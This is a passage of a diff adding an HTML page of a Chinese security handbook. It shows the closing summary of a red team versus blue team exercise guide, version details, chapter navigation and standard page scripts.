+<li>验证安全控制</li>
+<li>提升团队能力</li>
+<li>完善响应流程</li>
+</ul>
+<p>成功的红蓝对抗需要：</p>
+<ol>
+<li>明确的目标和范围</li>
+<li>专业的红蓝团队</li>
+<li>完善的规则制度</li>
+<li>持续的改进优化</li>
+</ol>
+<p>记住：红蓝对抗的目的是共同进步，而非简单的胜负。</p>
+<hr />
+<p><strong>文档版本</strong>: v3.0
+<strong>最后更新</strong>: 2024年4月
+<strong>维护者</strong>: Red Team &amp; Blue Team
+<strong>反馈邮箱</strong>: security@example.com</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../编程/security/渗透测试.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../编程/security/网络攻击.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../编程/security/渗透测试.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../编程/security/网络攻击.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../theme/segmentit.umd.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../theme/searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
+
